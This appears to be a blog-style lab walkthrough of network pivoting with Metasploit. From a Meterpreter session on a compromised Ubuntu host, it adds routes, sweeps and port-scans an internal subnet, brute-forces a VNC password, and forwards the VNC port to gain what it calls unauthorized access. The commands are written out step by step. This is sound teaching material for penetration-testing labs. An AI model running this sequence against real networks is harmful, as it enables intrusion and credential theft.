# VNC pivoting using Meterpreter

**Lab Setup requirement:**

**Attacker Machine**: Kali Linux

**Pivot Machine**:  Ubuntu operating system with **two** network interface

Target Machine: Ubuntu \(Allow VNC service\)

![](https://i1.wp.com/3.bp.blogspot.com/-OxfPtaxgGEA/WdJtcz9GK-I/AAAAAAAARxY/BqccVBJ7OKkAL5iE9kyKnmSaJlUKQtGJwCLcBGAs/s1600/11.png?w=687&ssl=1)

#### **Exploit pivot machine**

Generate payload using msfvenom start multi/handler to hack the pivot machine \(ubuntu\) read the complete article from **here** and bypass its UAC to achieve admin privileges.sysinfo

| 1 | sysinfo |
| :--- | :--- |


 ****From the given image you can confirm that I owned a pivot machine \(192.168.1.226\) meterpreter session.

![](https://i0.wp.com/1.bp.blogspot.com/-zR_6L0cwp5o/WdJtdPciXEI/AAAAAAAARxc/tjcTXVvTatEGBJ9VXkjoxjI4ptNjePhugCLcBGAs/s1600/12.png?w=687&ssl=1)

Check the network interface through the following command:meterpreter&gt; ifconfig

| 1 | meterpreter&gt; ifconfig |
| :--- | :--- |


From the given image you can observe two networks interface in pivot’s system **1st** for IP **192.168.1.226** through which the attacker is connected and **2nd** for IP **10.0.0.10** through which VNC server \(targets\) are connected.

![](https://i0.wp.com/3.bp.blogspot.com/-UH7xx63qqMw/WdJtdD0ZOWI/AAAAAAAARxg/mWSuS-dDuc8l-QajqFd2DnU-JsGLHaFyACLcBGAs/s1600/13.png?w=687&ssl=1)

#### **Route Add**

Since the attacker belongs to the **192.168.1.1** interface and client belongs to **10.0.0.0** interface, therefore, it is not possible to directly make an attack on client network until unless the attacker acquires the same network connection. In order to achieve a 10.0.0.0 network attacker need to run the **post exploitation** “autoroute”.use post/multi/manage/autoroute   
msf post\(autoroute\) &gt; set session 3  
msf post\(autoroute\) &gt; exploit

| 123 | use post/multi/manage/autoroutemsf post\(autoroute\) &gt; set session 3msf post\(autoroute\) &gt; exploit |
| :--- | :--- |


![](https://i2.wp.com/4.bp.blogspot.com/-JtKqHypEi8E/WdJtdr8UtxI/AAAAAAAARxk/94-l01wzj5Id8pe677PQbwNIM089WHy5wCLcBGAs/s1600/15.png?w=687&ssl=1)

#### **ARP Sweep to identify Active host**

This module will enumerate alive Hosts in the local network using ARP requests. Take help from target network interface 3 as shown above for MAC address and other details.use auxiliary/scanner/discovery/arp\_sweep  
msf auxiliary\(arp\_sweep\) &gt;set rhost 10.0.0.1-254  
msf auxiliary\(arp\_sweep\) &gt;set shost 10.0.0.10  
msf auxiliary\(arp\_sweep\) &gt;set smac 00:0c:29:bf:43:94  
msf auxiliary\(arp\_sweep\) &gt;run

| 12345 | use auxiliary/scanner/discovery/arp\_sweepmsf auxiliary\(arp\_sweep\) &gt;set rhost 10.0.0.1-254msf auxiliary\(arp\_sweep\) &gt;set shost 10.0.0.10msf auxiliary\(arp\_sweep\) &gt;set smac 00:0c:29:bf:43:94msf auxiliary\(arp\_sweep\) &gt;run |
| :--- | :--- |


Here we found a new host IP **10.0.0.20** as shown in the given image. Let’s perform TCP port scan for activated services on this machine.

![](https://i2.wp.com/1.bp.blogspot.com/-iPzsNs96XXc/WdJtdgQWq_I/AAAAAAAARxo/K_QHuq5wj9Ug5usLp4T4Gn8fda_jq3TnwCLcBGAs/s1600/16.png?w=687&ssl=1)

#### **TCP Port Scan**

This module will enumerate open TCP port of the target system.use auxiliary/scanner/portscan/tcp  
msf auxiliary\(tcp\) &gt; set rhosts 10.0.0.20  
msf auxiliary\(tcp\) &gt; set thread 20  
msf auxiliary\(tcp\) &gt;exploit

| 1234 | use auxiliary/scanner/portscan/tcpmsf auxiliary\(tcp\) &gt; set rhosts 10.0.0.20msf auxiliary\(tcp\) &gt; set thread 20msf auxiliary\(tcp\) &gt;exploit |
| :--- | :--- |


From given you can observe **port 5900** is **open** and we know that 5900 used for VNC services.

![](https://i1.wp.com/3.bp.blogspot.com/-tz2KjiFv0GE/WdJtd7BV-XI/AAAAAAAARxs/cjdyKHF8POQpIvW7UgoxwNbh7iTF6z3BQCLcBGAs/s1600/17.png?w=687&ssl=1)

#### Bruteforcing VNC Login

In order to steal password for making unauthorized access in VNC machine apply Brute force attack using password, the dictionary is given below exploit.use auxiliary/scanner/vnc/vnc\_login  
msf auxiliary\(vnc\_login\) &gt;set rhosts 10.0.0.20  
msf auxiliary\(vnc\_login\) &gt;set pass\_file /root/Desktop/pass.txt  
msf auxiliary\(vnc\_login\) &gt; run

| 1234 | use auxiliary/scanner/vnc/vnc\_loginmsf auxiliary\(vnc\_login\) &gt;set rhosts 10.0.0.20msf auxiliary\(vnc\_login\) &gt;set pass\_file /root/Desktop/pass.txtmsf auxiliary\(vnc\_login\) &gt; run |
| :--- | :--- |


**Awesome!!** From given below image you can observe the same **password: 123456** have been found by Metasploit.

![](https://i2.wp.com/3.bp.blogspot.com/-FWRXkU4oOtQ/WdJteTHHapI/AAAAAAAARx4/Y7JyUzR4tfoGDcGrgveJ1x9n2z_DOTzKACLcBGAs/s1600/18.png?w=687&ssl=1)

#### **VNC Port forwarding on Local port**

Now Type the following command for port forwarding on localhost.meterpreter&gt; portfwd add –l 6000 –p 5900 –r 10.0.0.20

| 1 | meterpreter&gt; portfwd add –l 6000 –p 5900 –r 10.0.0.20 |
| :--- | :--- |


-l: This is a local port to listen on.

-p: The remote port to connect on.

-r:  The remote host address to connect on.

![](https://i2.wp.com/4.bp.blogspot.com/-8okgBDZDQr4/WdJteTzhhxI/AAAAAAAARxw/74ebcehdWlQ4_dX_o-qKlbQfS0fUzXQcgCLcBGAs/s1600/20.png?w=687&ssl=1)

Now open the terminal and type following command to connect the target machine:vncviewer 127.0.0.1:6000

| 1 | vncviewer 127.0.0.1:6000 |
| :--- | :--- |


**Wonderful!!** We had successfully exploited the VNC client by making unauthorized access.

\*\*\*\*

